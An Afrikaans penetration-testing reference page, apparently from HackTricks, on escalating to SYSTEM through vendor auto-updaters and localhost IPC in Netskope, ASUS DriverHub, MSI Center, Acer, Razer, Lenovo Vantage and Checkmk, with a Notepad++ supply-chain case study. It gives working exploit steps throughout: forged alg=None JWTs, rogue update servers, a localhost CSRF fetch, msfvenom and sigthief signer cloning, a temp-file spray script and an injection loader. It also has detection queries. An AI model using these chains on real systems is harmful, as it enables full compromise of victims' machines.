# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows plaaslike privilege escalation-kettings wat in enterprise endpoint-agente en updaters gevind word, wat ’n maklik-toeganklike IPC-oppervlak en ’n bevoorregte update-vloei blootstel. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae voorregte enrollment na ’n attacker-controlled server kan afdwing en daarna ’n malicious MSI kan lewer wat deur die SYSTEM-diens geïnstalleer word.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Sleutelidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n bevoorregte diens se localhost IPC om her-enrollment of herkonfigurasie na ’n attacker server af te dwing.
- Implementeer die vendor se update-endpoints, lewer ’n rogue Trusted Root CA, en wys die updater na ’n malicious, “signed” package.
- Omseil swak signer checks (CN allow-lists), opsionele digest flags en permissiewe MSI properties.
- As IPC “encrypted” is, lei die key/IV af van machine identifiers wat wêreldleesbaar in die registry gestoor word.
- As die diens callers volgens image path/process name beperk, inject in ’n allow-listed process of spawn een suspended en bootstrap jou DLL via ’n minimale thread-context patch.

---
## 1) Dwing enrollment na ’n attacker server via localhost IPC

Baie agente verskaf ’n user-mode UI-process wat met ’n SYSTEM-diens oor localhost TCP deur JSON kommunikeer.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-vloei:
1) Stel ’n JWT enrollment token saam waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning command oproep, saam met jou JWT en tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server vir enrollment/config kontak, byvoorbeeld:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Indien caller verification op pad/naam gebaseer is, laat die versoek vanaf ’n allow-listed vendor binary kom (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Kaping van die update channel om code as SYSTEM uit te voer

Sodra die client met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Return JSON config met ’n baie kort updater interval, byvoorbeeld:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return ’n PEM CA certificate. Die diens installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Verskaf metadata wat na ’n malicious MSI en ’n vals weergawe wys.

Om algemene checks wat in die praktyk voorkom, te omseil:
- Signer CN allow-list: die diens mag dalk slegs kontroleer of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI sign.
- CERT_DIGEST property: sluit ’n benign MSI property genaamd CERT_DIGEST in. Geen enforcement tydens install nie.
- Optional digest enforcement: ’n config flag (bv. check_msi_digest=false) deaktiveer addisionele cryptographic validation.

Resultaat: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrary code uit as NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass-les: indien ’n vendor reageer deur ’n klein stel “trusted” domains toe te laat in plaas daarvan om die update source cryptographically te authenticate, soek vendor-owned redirectors of reverse proxies wat jou steeds toelaat om traffic te stuur. In Netskope se geval het openbare follow-up research gewys dat ’n R129-era allow-list steeds misbruik kon word deur `rproxy.goskope.com`, wat attacker-controlled Azure App Service-content geproxy het. Behandel hostname allow-lists as ’n speed bump, nie as ’n trust boundary nie.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (wanneer teenwoordig)

Vanaf R127 het Netskope IPC JSON in ’n encryptData-veld toegedraai wat soos Base64 lyk. Reversing het AES getoon, met die key/IV afkomstig van registry values wat deur enige user gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers kan encryption reproduce en geldige encrypted commands vanaf ’n standard user stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene tip: indien ’n agent skielik sy IPC “encrypt”, soek na device IDs, product GUIDs en install IDs onder HKLM wat as materiaal gebruik word.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige services probeer die peer authenticate deur die TCP connection se PID op te los en die image path/name te vergelyk met allow-listed vendor binaries wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese bypasses:
- DLL injection in ’n allow-listed process (bv. nsdiag.exe) en proxy IPC van binne dit.
- Spawn ’n allow-listed binary suspended en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-enforced tamper rules te bevredig.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection-vriendelike injection: suspended process + NtContinue patch

Products bevat dikwels ’n minifilter/OB callbacks driver (bv. Stadrv) om gevaarlike regte van handles na protected processes te verwyder:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) CreateProcess van ’n vendor binary met CREATE_SUSPENDED.
2) Verkry handles waartoe jy steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die process, en ’n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of slegs THREAD_RESUME indien jy code by ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, gewaarborgde-mapped thunk) met ’n klein stub wat LoadLibraryW op jou DLL path call en dan terugspring.
4) ResumeThread om jou stub in-process te trigger, waardeur jou DLL gelaai word.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds-protected process gebruik het nie (jy het dit geskep), voldoen die driver se policy.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiseer ’n rogue CA, malicious MSI signing en die serving van die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is ’n custom IPC client wat arbitrary (opsioneel AES-encrypted) IPC messages craft en die suspended-process injection insluit om vanaf ’n allow-listed binary te originateer.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow vir onbekende updater/IPC surfaces

Wanneer jy met ’n nuwe endpoint agent of motherboard-“helper”-suite te doen kry, is ’n vinnige workflow gewoonlik genoeg om te bepaal of jy na ’n belowende privesc-target kyk:<sup>[[6]](#references)</sup>

1) Enumerate loopback listeners en map hulle terug na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Ontgin registergesteunde roeteringsdata wat deur plugin-gebaseerde IPC-bedieners gebruik word:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Onttrek eers endpoint names, JSON keys en command IDs uit die user-mode client. Packed Electron/.NET frontends leak gereeld die volledige skema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Soek na die werklike trust predicate, nie net die code path wat uiteindelik die process launch nie:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrone wat prioriteit verdien:
- `CryptQueryObject`/certificate parsing sonder `WinVerifyTrust` beteken gewoonlik dat “certificate exists” as “certificate is trusted” behandel is, wat certificate cloning of ander fake-signer-tricks moontlik maak.
- Substring/suffix checks oor `Origin`, `Referer`, download URLs, process names of signer CNs is nie authentication nie. `contains(".vendor.com")` is gewoonlik exploitable met attacker-controlled lookalike domains.
- As die low-privileged GUI besluit “the file is trusted” en die SYSTEM broker bloot daardie resultaat verbruik, om die client-side DLL/JS te patch of te herimplementeer, omseil dikwels die boundary volledig (Razer-style split validation).
- As die broker ’n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie path valideer of skeduleer, toets onmiddellik vir TOCTOU replacement windows en vir sibling plugin modules wat alternatiewe `ExecuteTask()` wrappers met swakker checks blootstel.<sup>[[6]](#references)</sup>

Vir named-pipe-heavy targets is PipeViewer ’n vinnige manier om swak DACLs en remotely reachable pipes raak te sien voordat jy die protocol in diepte begin reverse-engineer.<sup>[[11]](#references)</sup>

As die target callers slegs volgens PID, image path of process name authenticate, behandel dit as ’n speed bump eerder as ’n boundary: injecting into the legitimate client, of om die connection vanuit ’n allow-listed process te maak, is dikwels genoeg om aan die server se checks te voldoen. Vir named pipes spesifiek dek [hierdie page oor client impersonation en pipe abuse](named-pipe-client-impersonation.md) die primitive in meer diepte.

---
## 8) Modular add-in brokers wat slegs deur vendor signatures geauthentiseer word (Lenovo Vantage pattern)

’n Nuwer variasie wat die moeite werd is om te hunt, is die **signed-client RPC broker**: ’n low-privileged Lenovo-signed desktop process kommunikeer met ’n SYSTEM service, en die service routeer JSON commands na ’n stel XML-beskrewe add-ins onder `%ProgramData%`. Sodra code execution **binne enige accepted signed client** bereik is, word elke `runas="system"` contract deel van jou attack surface.<sup>[[15]](#references)</sup>

High-value primitives wat in Lenovo Vantage research waargeneem is:
- **Trusting the caller because it is signed by the vendor**: researchers het ’n authenticated context bereik deur ’n Lenovo-signed EXE na ’n writable directory te kopieer en ’n DLL side-load (`profapi.dll`) te bevredig, sodat arbitrary code binne ’n client geloop het wat die service reeds vertrou het.
- **Manifest-driven attack surface discovery**: add-ins word onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` gedeclareer; verskeie contracts loop as `SYSTEM`, dus onthul die enumerating van daardie manifests dikwels die werklike privileged verbs vinniger as om die broker self te reverse-engineer.
- **Per-command bugs behind the authenticated channel**: sodra jy binne die trusted client is, het public research path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, en substring-based registry path checks gevind wat writes buite die bedoelde hive moontlik gemaak het.

Nuttige recon op ’n target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktiese gevolgtrekking: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** authentiseer en dan na tientalle plugin/add-in-opdragte dispatch, moenie ophou nadat jy die front-door trust check omseil het nie. Dump die manifest/contract table en fuzz elke high-privilege verb onafhanklik; die geauthentiseerde kanaal verberg gewoonlik verskeie second-stage bugs.

---
## 1) Browser-na-localhost CSRF teen bevoorregte HTTP API's (ASUS DriverHub)

DriverHub verskaf ’n user-mode HTTP-diens (ADU.exe) op 127.0.0.1:53000 wat browser calls verwag wat vanaf https://driverhub.asus.com kom. Die origin filter voer bloot `string_contains(".asus.com")` uit oor die Origin header en oor download URLs wat deur `/asus/v1.0/*` blootgestel word. Enige aanvaller-beheerde host soos `https://driverhub.asus.com.attacker.tld` slaag dus die check en kan state-changing requests vanaf JavaScript uitreik.<sup>[[6]](#references)</sup> Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir verdere bypass patterns.

Praktiese vloei:
1) Registreer ’n domain wat `.asus.com` insluit en host ’n kwaadwillige webblad daar.
2) Gebruik `fetch` of XHR om ’n bevoorregte endpoint (byvoorbeeld `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON body wat deur die handler verwag word – die packed frontend JS wys die schema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder getoon word, slaag wanneer die Origin-header na die vertroude waarde vervals word:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige browser-besoek aan die attacker site word dus ’n 1-click (of 0-click via `onload`) plaaslike CSRF wat ’n SYSTEM-helper aandryf.

---
## 2) Onveilige code-signing-verifikasie & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre executables af wat in die JSON-body gedefinieer word en cache dit in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die download kontroleer ADU.exe bloot dat die PE ’n signature bevat en dat die Subject-string met ASUS ooreenstem voordat dit dit uitvoer – geen `WinVerifyTrust` nie, geen chain validation nie.

Om die flow te weaponize:
1) Create ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS se signer daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op ’n `.asus.com` lookalike domain en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin- en URL-filters substring-based is en die signer check slegs strings vergelyk, haal DriverHub die attacker binary af en execute dit onder sy elevated context.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU binne updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-service expose ’n TCP-protocol waar elke frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die core component (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Copies die supplied executable na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies die signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Creates ’n scheduled task wat die temp file as SYSTEM uitvoer met attacker-controlled arguments.

Die copied file word nie tussen verification en `ExecuteTask()` gelock nie. ’n Attacker kan:
- Frame A stuur wat na ’n legitimate MSI-signed binary wys (waarborg dat die signature check slaag en die task gequeue word).
- Dit race met herhaalde Frame B-boodskappe wat na ’n malicious payload wys en `MSI Center SDK.exe` net ná die verification voltooi is, overwrite.

Wanneer die scheduler fire, execute dit die overwritten payload onder SYSTEM, ondanks dat die oorspronklike file validated is. Betroubare exploitation gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU-window gewen word.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 bytes van ’n frame kies daardie component, wat attackers toelaat om commands na arbitrêre modules te route.
- Plugins kan hul eie task runners defineer. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` en call direk `API_Support.EX_Task::ExecuteTask()` met **geen** signature validation nie – enige local user kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en deterministiese SYSTEM execution kry.
- Sniffing van loopback met Wireshark of instrumenting van die .NET binaries in dnSpy wys vinnig die Component ↔ command-mapping; custom Go-/Python-clients kan daarna frames replay.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, en sy discretionary ACL laat remote clients toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Deur command ID `7` met ’n file path te stuur, word die service se process-spawning-routine invoked.
- Die client library serialize ’n magic terminator byte (113) saam met args. Dynamic instrumentation met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumentation-tips) wys dat die native handler hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integrity SID map voordat dit `CreateProcessAsUser` call.
- Deur 113 (`0x71`) met 114 (`0x72`) te swap, val dit in die generic branch wat die volledige SYSTEM-token behou en ’n high-integrity SID (`S-1-16-12288`) stel. Die spawned binary run dus as unrestricted SYSTEM, beide plaaslik en cross-machine.
- Combineer dit met die exposed installer flag (`Setup.exe -nocheck`) om ACC selfs op lab-VMs op te stel en die pipe sonder vendor hardware te exercise.<sup>[[6]](#references)</sup>

Hierdie IPC-bugs beklemtoon waarom localhost-services mutual authentication moet enforce (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en waarom elke module se “run arbitrary binary”-helper dieselfde signer verifications moet deel.

---
## 3) COM/IPC-“elevator”-helpers backed deur swak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige pattern tot hierdie family bygevoeg: ’n low-privileged user kan ’n COM-helper vra om ’n process deur `RzUtility.Elevator` te launch, terwyl die trust decision aan ’n user-mode DLL (`simple_service.dll`) gedelegeer word eerder as om dit robuust binne die privileged boundary af te dwing.

Observed exploitation path:
- Instantiate die COM-object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` om ’n elevated launch te request.
- In die public PoC word die PE-signature gate binne `simple_service.dll` uitgepatch voordat die request uitgereik word, wat toelaat dat ’n arbitrêre attacker-chosen executable gelaunch word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Algemene gevolgtrekking: wanneer jy “helper”-suites reverse, moenie by localhost TCP of named pipes stop nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater`, of `Utility`, en verifieer dan of die gepriviligeerde diens werklik die teikenbinêre self valideer, of bloot ’n resultaat vertrou wat deur ’n patchbare user-mode client DLL bereken is. Hierdie patroon veralgemeen verder as Razer: enige gesplete ontwerp waar die hoëprivilige broker ’n allow/deny-besluit van die laeprivilige kant verbruik, is ’n kandidaat-privesc-oppervlak.


---
## Voorspelbare temp script execution tydens MSI repair (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agents implementeer steeds gepriviligeerde aksies deur ’n tydelike `.cmd` in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae privilegies die toekomstige temp-lêer vooraf as **read-only** skep en die gepriviligeerde proses aanvallerbeheerde inhoud laat uitvoer in plaas van sy eie script.

Waargeneem in kwesbare Checkmk Agent builds:
- temp-patroon: `cmk_all_<PID>_1.cmd`
- geaffekteerde branches: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI **repair** van die gecachede agent-pakket<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese workflow:
1. Skat ’n realistiese PID-reeks vanaf huidige proses-ID’s of die lopende agent-PID.
2. Skryf ’n kort **ASCII** `.cmd`-payload (`Set-Content -Encoding Ascii` of `cmd.exe`-redirection; vermy UTF-16 PowerShell-output vir batch files).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks en merk elke lêer as read-only.
4. Trigger ’n repair van die gecachede MSI sodat die gepriviligeerde diens probeer om die temp script te regenereer en dit daarna uitvoer.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
As die kwesbare produk met Windows Installer geïnstalleer is, koppel die lukraak lykende gekaste MSI onder `C:\Windows\Installer` terug aan sy produknaam voordat die herstel geaktiveer word:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanuit ’n nie-interaktiewe WinRM-shell misluk en jy moet verstaan of ’n bestaande desktop-/ontkoppelde sessie die herstelproses korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon veralgemeen na ander endpoint-agents en updaters wat **tydelike scripts in wêreld-skryfbare liggings plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe skeppingssemantiek, en herstel-/update-vloeie wat op aanvraag geaktiveer kan word.

---
## Remote supply-chain-kaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die hosting-infrastruktuur agter die Notepad++-updatevloei gekompromitteer het, selektief kwaadwillige manifests aan gekose slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van updates volledig geverifieer nie, sodat ’n vyandige XML-respons kliënte na aanvaller-beheerde URLs kon herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om beide ’n vertroude sertifikaatketting en ’n geldige PE-signature op die afgelaaide installer af te dwing, het slagoffers ’n getrojaniseerde NSIS `update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike exploit nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer CDN/hosting en antwoord op update-kontroles met aanvaller-metadata wat na ’n kwaadwillige download-URL wys.
2. **Getrojaniseerde NSIS**: die installer laai ’n payload af/voer dit uit en misbruik twee uitvoeringskettings:
- **Bring-your-own signed binary + sideload**: sluit die getekende Bitdefender `BluetoothService.exe` in en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die getekende binary loop, laai Windows `log.dll` via sideloading, waarna dit die Chrysalis-backdoor dekripteer en reflektief laai (Warbird-beskermd + API hashing om statiese detection te bemoeilik).
- **Scripted shellcode injection**: NSIS voer ’n gekompileerde Lua-script uit wat Win32 APIs (bv. `EnumWindowStationsW`) gebruik om shellcode te injecteer en Cobalt Strike Beacon te stage.<sup>[[12]](#references)</sup>

Hardening-/detection-lesse vir enige auto-updater:
- Dwing **sertifikaat- + signature-verifikasie** van die afgelaaide installer af (pin die vendor signer, verwerp nie-ooreenstemmende CN/kettings) en teken die update-manifest self (bv. XMLDSig). Blokkeer manifest-beheerde redirects tensy dit gevalideer is.
- Behandel **BYO signed binary sideloading** as ’n post-download detection-pivot: genereer ’n alert wanneer ’n getekende vendor-EXE ’n DLL-naam buite sy kanonieke installasiepad laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installers vanaf temp plaas/uitvoer met nie-vendor-signatures.
- Monitor **malware-spesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as generiese pivots): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skrywes na `%TEMP%`, en Lua-gedrewe shellcode-injection-stadia.
- Notepad++ het WinGUp in v8.8.9 en later versterk: die teruggestuurde XML is nou geteken (XMLDSig), en nuwer builds dwing sertifikaat- + signature-verifikasie van die afgelaaide installer af in plaas daarvan om slegs die transport te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n nie-Notepad++-installeerder lanseer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone veralgemeen na enige updater wat unsigned manifests aanvaar of versuim om installer signers vas te pen—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die dekmantel van “trusted” updates.

---
## Verwysings
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
